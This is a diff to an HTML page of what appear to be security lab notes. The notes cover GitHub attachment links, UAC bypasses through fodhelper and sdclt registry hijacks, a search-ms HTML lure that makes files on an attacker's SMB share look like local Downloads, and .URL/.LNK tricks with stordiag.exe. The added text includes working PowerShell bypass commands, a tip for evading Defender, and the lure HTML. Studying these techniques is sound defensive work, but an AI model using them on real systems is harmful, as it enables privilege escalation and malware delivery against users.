@@ -89,7 +89,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/index.html"><strong aria-hidden="true">1.</strong> GitHub File Upload Exploit</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/The_Exploit.html"><strong aria-hidden="true">1.1.</strong> The Exploit</a></li><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/Analysis.html"><strong aria-hidden="true">1.2.</strong> Analysis</a></li></ol></li><li class="chapter-item expanded "><a href="UAC_Bypass/index.html"><strong aria-hidden="true">2.</strong> UAC Bypass</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="UAC_Bypass/UACMe.html"><strong aria-hidden="true">2.1.</strong> UACMe</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/UACMe_Setup.html"><strong aria-hidden="true">2.2.</strong> UACMe Setup</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Manual_fodhelper.exe_Exploit.html"><strong aria-hidden="true">2.3.</strong> Manual fodhelper.exe Exploit</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Manual_sdclt.exe_Exploit.html"><strong aria-hidden="true">2.4.</strong> Manual sdclt.exe Exploit</a></li></ol></li><li class="chapter-item expanded "><a href="Windows_Search_Exploit/index.html"><strong aria-hidden="true">3.</strong> Windows Search Exploit</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="Windows_Search_Exploit/Explanation.html"><strong aria-hidden="true">3.1.</strong> Explanation</a></li><li class="chapter-item expanded "><a href="Windows_Search_Exploit/PoC.html"><strong aria-hidden="true">3.2.</strong> PoC</a></li></ol></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/index.html"><strong aria-hidden="true">1.</strong> GitHub File Upload Exploit</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/The_Exploit.html"><strong aria-hidden="true">1.1.</strong> The Exploit</a></li><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/Analysis.html"><strong aria-hidden="true">1.2.</strong> Analysis</a></li></ol></li><li class="chapter-item expanded "><a href="UAC_Bypass/index.html"><strong aria-hidden="true">2.</strong> UAC Bypass</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="UAC_Bypass/UACMe.html"><strong aria-hidden="true">2.1.</strong> UACMe</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/UACMe_Setup.html"><strong aria-hidden="true">2.2.</strong> UACMe Setup</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Manual_fodhelper.exe_Exploit.html"><strong aria-hidden="true">2.3.</strong> Manual fodhelper.exe Exploit</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Manual_sdclt.exe_Exploit.html"><strong aria-hidden="true">2.4.</strong> Manual sdclt.exe Exploit</a></li></ol></li><li class="chapter-item expanded "><a href="Windows_Search_Exploit/index.html"><strong aria-hidden="true">3.</strong> Windows Search Exploit</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="Windows_Search_Exploit/Explanation.html"><strong aria-hidden="true">3.1.</strong> Explanation</a></li><li class="chapter-item expanded "><a href="Windows_Search_Exploit/PoC.html"><strong aria-hidden="true">3.2.</strong> PoC</a></li><li class="chapter-item expanded "><a href="Windows_Search_Exploit/PoC_Linux.html"><strong aria-hidden="true">3.3.</strong> PoC-Linux</a></li></ol></li><li class="chapter-item expanded "><a href="Evil_Txt_File/index.html"><strong aria-hidden="true">4.</strong> Evil.txt</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="Evil_Txt_File/Explanation.html"><strong aria-hidden="true">4.1.</strong> Explanation</a></li><li class="chapter-item expanded "><a href="Evil_Txt_File/Analysis.html"><strong aria-hidden="true">4.2.</strong> Analysis</a></li></ol></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
@@ -252,8 +252,8 @@ https://github.com/fvj-mal-test/Upload_Exploit/assets/173075384/330b5754-1919-44
 </ul>
 <h2 id="conclusions"><a class="header" href="#conclusions">Conclusions</a></h2>
 <ul>
-<li>Files that can be viewed within the browser (images) are linked to the users account.</li>
-<li>Files that require to be downloaded to be accessed, can be downloaded by anyone.</li>
+<li>Files that can be viewed within the browser (images) are linked to the users account. The permalink can only be accessed if the user is logged in.</li>
+<li>Files that require to be downloaded to be accessed, can be downloaded by anyone. The permalink is a generic <code>github.com\user-attachements</code> link.</li>
 <li>Link is generated as soon as files are uploaded. Link persists even if issue is never posted.</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="uac-bypass"><a class="header" href="#uac-bypass">UAC Bypass</a></h1>
@@ -312,7 +312,10 @@ Component(s): Attacker defined
 Implementation: ucmShellRegModMethod
 Works from: Windows 10 (10240)
 </code></pre>
-<p>The registry key exploits work by modifying the values of the registry keys accessed during the execution of programs with administrative privileges.</p>
+<ul>
+<li>All of the exploits listed above fall under the category of Registry modification.</li>
+<li>They work by modifying the values of the registry keys accessed during the execution of programs with administrative privileges.</li>
+</ul>
 <h3 id="6-exploit-41"><a class="header" href="#6-exploit-41">6. Exploit 41</a></h3>
 <pre><code>Author: Oddvar Moe
 Type: Elevated COM interface
@@ -372,6 +375,10 @@ Works from: Windows 7 (7600)
 <p>Build the solution</p>
 </li>
 </ul>
+<h3 id="notes"><a class="header" href="#notes">Notes</a></h3>
+<ul>
+<li>All the exploits are well known. Defender will block and delete the executable. Disable defender before building the solution.</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div><h3 id="create-registry-structure"><a class="header" href="#create-registry-structure">Create Registry Structure</a></h3>
 <pre><code class="language-Powershell">New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 
@@ -387,34 +394,39 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -
 
 Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 </code></pre>
+<h3 id="notes-1"><a class="header" href="#notes-1">Notes</a></h3>
 <ul>
-<li>This direct method of UAC bypass has been patched.</li>
-<li>When trying to set the value of the registry entry to "cmd.exe", windows will automatically close the shell.</li>
+<li>Defender is triggered when trying to set the registry value as "cmd.exe"</li>
+<li>This can be bypassed. Create a shortcut to "cmd.exe". Then use the path to that shortcut as the registry value.</li>
+<li>Worked on Windows 10 Pro N 1909 Build 18363.1139 after disabling Defender.</li>
+<li>Worked on  Windows 11 Pro N 23H2 Build 22631.3737 after disabling Defender.</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div><h3 id="create-the-registry"><a class="header" href="#create-the-registry">Create the Registry</a></h3>
 <pre><code class="language-Powershell">
-reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f
-reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
+New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Force
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
 
 </code></pre>
 <h3 id="call-sdcltexe"><a class="header" href="#call-sdcltexe">Call sdclt.exe</a></h3>
 <pre><code class="language-powershell">
-%windir%\system32\sdclt.exe
+Start-Process "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden
 
 </code></pre>
 <h3 id="cleanup-1"><a class="header" href="#cleanup-1">Cleanup</a></h3>
 <pre><code class="language-Powershell">
-reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f
+Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Recurse -Force
 
 </code></pre>
-<h3 id="notes"><a class="header" href="#notes">Notes</a></h3>
+<h3 id="notes-2"><a class="header" href="#notes-2">Notes</a></h3>
 <ul>
-<li>Broke system after restart <img src="UAC_Bypass/Attachments/Pasted%20image%2020240624105411.png" alt="" /></li>
+<li>Didn't work on Windows 10 Pro N 1909 Build 18363.1139</li>
+<li>Didn't work on  Windows 11 Pro N 23H2 Build 22631.3737</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="windows-search-exploit"><a class="header" href="#windows-search-exploit">Windows Search Exploit</a></h1>
 <ul>
 <li><a href="Windows_Search_Exploit/Windows_Search_Exploit%5CExplanation.html">Explanation</a></li>
 <li><a href="Windows_Search_Exploit/Windows_Search_Exploit%5CPoC.html">PoC</a></li>
+<li><a href="Windows_Search_Exploit/Windows_Search_Exploit%5CPoC_Linux.html">PoC-Linux</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div><ul>
 <li>HTML attachments that abuse the Windows search protocol (search-ms URI) to push batch files hosted on remote servers that deliver malware.</li>
@@ -452,18 +464,24 @@ reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f
 <pre><code>reg delete HKEY_CLASSES_ROOT\search /f
 reg delete HKEY_CLASSES_ROOT\search-ms /f
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="victims-machine"><a class="header" href="#victims-machine">Victim's Machine</a></h2>
+<ul>
+<li>OS - Windows 10 1909</li>
+<li>Build - 18363.1139</li>
+</ul>
+<h2 id="attackers-machine"><a class="header" href="#attackers-machine">Attacker's Machine</a></h2>
+<ul>
 <li>OS - Windows 10 1909</li>
 <li>Build - 18363.1139</li>
 </ul>
 <h2 id="setting-up"><a class="header" href="#setting-up">Setting Up</a></h2>
-<h4 id="attackers-machine"><a class="header" href="#attackers-machine">Attacker's Machine</a></h4>
+<h4 id="attackers-machine-1"><a class="header" href="#attackers-machine-1">Attacker's Machine</a></h4>
 <ul>
 <li>There is a SMB share set up on the attacker's machine.</li>
 <li>The files are accessible to everyone on the network.<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240708021919.png" alt="" /></li>
 <li>For testing purposes, there is a text file ( Hello.txt )  in the folder.<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240708024507.png" alt="" /></li>
 </ul>
-<h4 id="victims-machine"><a class="header" href="#victims-machine">Victim's Machine</a></h4>
+<h4 id="victims-machine-1"><a class="header" href="#victims-machine-1">Victim's Machine</a></h4>
 <ul>
 <li>The victim machine has a HTML file designed to open up the payload on the attackers machine and disguise it as a local file.</li>
 <li>The HTML file</li>
@@ -497,6 +515,155 @@ reg delete HKEY_CLASSES_ROOT\search-ms /f
 <li>
 <p>If the Victim uses a different layout, the actual location will not be visible.<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240708024753.png" alt="" /></p>
 </li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="victims-machine-2"><a class="header" href="#victims-machine-2">Victim's Machine</a></h2>
+<ul>
+<li>OS - Windows 10 1909</li>
+<li>Build - 18363.1139</li>
+</ul>
+<h2 id="attackers-machine-2"><a class="header" href="#attackers-machine-2">Attacker's Machine</a></h2>
+<ul>
+<li>OS - Ubuntu noble 24.04 x86_64</li>
+<li>Kernel - Linux 6.8.0-35-generic</li>
+</ul>
+<h2 id="setting-up-1"><a class="header" href="#setting-up-1">Setting Up</a></h2>
+<h4 id="attackers-machine-3"><a class="header" href="#attackers-machine-3">Attacker's Machine</a></h4>
+<ul>
+<li>A SMB share needs to be setup on the Attacker's machine.</li>
+<li>The shared folder should be accessible by guests.</li>
+<li>SMB version needs to be forces between 2 and 3.</li>
+</ul>
+<pre><code class="language-Text">client min protocol = SMB2
+client max protocol = SMB3
+</code></pre>
+<ul>
+<li>The shared folder needs to be set to guest mode.</li>
+</ul>
+<pre><code class="language-Text">[Share]
+path = /home/share
+public = yes
+guest only = yes
+force create mode = 0666
+force directory mode = 0777
+browseable = yes
+</code></pre>
+<ul>
+<li>For testing purposes, there is a text file ( Hacked.txt )  in the folder.<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240722004846.png" alt="" /></li>
+</ul>
+<h4 id="victims-machine-3"><a class="header" href="#victims-machine-3">Victim's Machine</a></h4>
+<ul>
+<li>The victim machine has a HTML file designed to open up the payload on the attackers machine and disguise it as a local file.</li>
+<li>The HTML file</li>
+</ul>
+<pre><code class="language-HTML">&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;div id="in-page-channel-node-id" data-channel-name="in-page-channel-cnXeD0"&gt;&lt;/div&gt;
+    &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
+    &lt;link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"&gt;
+    &lt;meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"&gt;
+    &lt;title&gt;Untitled&lt;/title&gt;
+    &lt;meta http-equiv="refresh" content="0; URL=search:query=hacked&amp;amp;crumb=location:\\x-VBOX\Share&amp;amp;displayname=Downloads"
+    &lt;p&gt;&lt;a href="search:query=hacked&amp;amp;crumb=location:\\x-VBOX\Share\&amp;amp;displayname=Downloads"&gt;Untitled&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="the-exploit-1"><a class="header" href="#the-exploit-1">The Exploit</a></h2>
+<ul>
+<li>Victim opens the HTML file to see a webpage with a popup.<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240722005020.png" alt="" /></li>
+<li>Opening Windows Explorer<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240722005156.png" alt="" />
+<ol>
+<li>Windows has searched for "hacked" .</li>
+<li>It appears as if the file is in "Downloads" .</li>
+</ol>
+</li>
+</ul>
+<h2 id="notes-3"><a class="header" href="#notes-3">Notes</a></h2>
+<ul>
+<li>Http servers didn't work for the exploit. Cannot access the files through windows explorer.</li>
+<li>Default linux Samba shares are not detected by windows as they use SMB1. SMB V2 &amp; V3 needs to be forced in settings.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h3 id="technical-details"><a class="header" href="#technical-details">Technical Details</a></h3>
+<ul>
+<li>CVE-2024-30050</li>
+<li>Windows Mark of the Web Security Feature Bypass Vulnerability</li>
+</ul>
+<h3 id="about-the-exploit"><a class="header" href="#about-the-exploit">About the Exploit</a></h3>
+<ul>
+<li>This is a UAC bypass technique that abuses <code>.URL</code> and <code>.LNK</code> files.</li>
+</ul>
+<h3 id="what-is-a-url-file"><a class="header" href="#what-is-a-url-file">What is a URL file?</a></h3>
+<ul>
+<li>It is an Internet Explorer era file that acts as a shortcut file.</li>
+<li>It is designed to link to websites, but it can be used to reference files.</li>
+<li>In this exploit it is used to call a local executable from a remote machine.</li>
+</ul>
+<h3 id="url-working-directory-bypass"><a class="header" href="#url-working-directory-bypass">URL working directory bypass</a></h3>
+<ul>
+<li>Referencing a remote file using a <code>.url</code> file will prompt a warning message.</li>
+<li>Referencing a local file will not prompt a warning message.</li>
+<li>The <code>WorkingDirectory</code> parameter allows us to define the directory in which the executable is executed. This can be either local or remote.</li>
+<li>In this exploit a local executable is referenced from a remote server without triggering the warning message.</li>
+<li>The <code>WorkingDirectory</code> for this executable is a folder on the remote server. The executables that search for specific files within the directory will now use the files from the remote server instead.</li>
+</ul>
+<h3 id="stordiagexe"><a class="header" href="#stordiagexe">stordiag.exe</a></h3>
+<ul>
+<li>Storage Diagnostic Tool allows System Administrators to collect and analyze storage-related data, which can help them troubleshoot Hard Disk and storage diagnostic issues. It can collect all storage and file system-related data and diagnostic logs and output them to a folder.</li>
+<li>stordiag.exe is designed to search the working directory for a file named as <code>powershell.exe</code>.</li>
+<li>This exploit uses a <code>.url</code> shortcut file to call <code>stordiage.exe</code> and then run it within a remote file share with a malicious executable named as <code>powershell.exe</code>.</li>
+</ul>
+<h3 id="lnk-files-and-archives"><a class="header" href="#lnk-files-and-archives">.LNK files and Archives</a></h3>
+<ul>
+<li><code>.lnk</code> is a shortcut file.</li>
+<li>It can be used to run files from within the archive. It will give a user prompt unless the file being referenced is a trusted file type.</li>
+<li><code>.url</code> is a trusted file type. So it does not prompt the user when referenced by the <code>.lnk</code> file.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><ul>
+<li>
+<p>Tested on</p>
+<ul>
+<li>Windows 10 1809</li>
+<li>Windows 10 1909</li>
+<li>Windows 10 21H2</li>
+<li>Windows 11 23H2</li>
+</ul>
+</li>
+<li>
+<p>All images and scripts are from testing on Windows 10 1909.</p>
+</li>
+</ul>
+<h3 id="url-file-to-open-cmd"><a class="header" href="#url-file-to-open-cmd">URL File to open CMD</a></h3>
+<pre><code class="language-Script">[InternetShortcut]
+Url=C:\Windows\System32\cmd.exe
+</code></pre>
+<ul>
+<li>Double clicking on the url file opens cmd.</li>
+</ul>
+<h3 id="url-file-that-runs-stordiagexe-in-a-remote-directory"><a class="header" href="#url-file-that-runs-stordiagexe-in-a-remote-directory">URL file that runs stordiag.exe in a remote directory</a></h3>
+<pre><code class="language-Script">[InternetShortcut]
+URL=C:\Windows\System32\stordiag.exe
+WorkingDirectory=\\Desktop-attacke\smb
+</code></pre>
+<ul>
+<li>Does not work as expected.</li>
+<li>Traced the execution using procmon.
+<img src="Evil_Txt_File/Attachments/Pasted%20image%2020240801010229.png" alt="" /></li>
+<li>Folder is being accessed by the program but <code>powershell.exe</code> file is not being run.</li>
+</ul>
+<h3 id="url-file-that-runs-stordiagexe-in-a-local-directory-debugging"><a class="header" href="#url-file-that-runs-stordiagexe-in-a-local-directory-debugging">URL file that runs stordiag.exe in a local directory (debugging)</a></h3>
+<pre><code class="language-Script">[InternetShortcut]
+URL=C:\Windows\System32\stordiag.exe
+WorkingDirectory=C:\Users\test\Music
+</code></pre>
+<ul>
+<li>Traced execution using procmon.
+<img src="Evil_Txt_File/Attachments/Pasted%20image%2020240801010717.png" alt="" /></li>
+<li>Folder is being accessed by the program but <code>powershell.exe</code> file is not being run.</li>
+</ul>
+<h3 id="additional-notes"><a class="header" href="#additional-notes">Additional Notes</a></h3>
+<ul>
+<li><code>powershell.exe</code> file is not being run by stordiag.exe</li>
+<li>procmon displayed "PATH NOT FOUND" error when local working directory was used in windows 11</li>
 </ul>
 
                     </main>
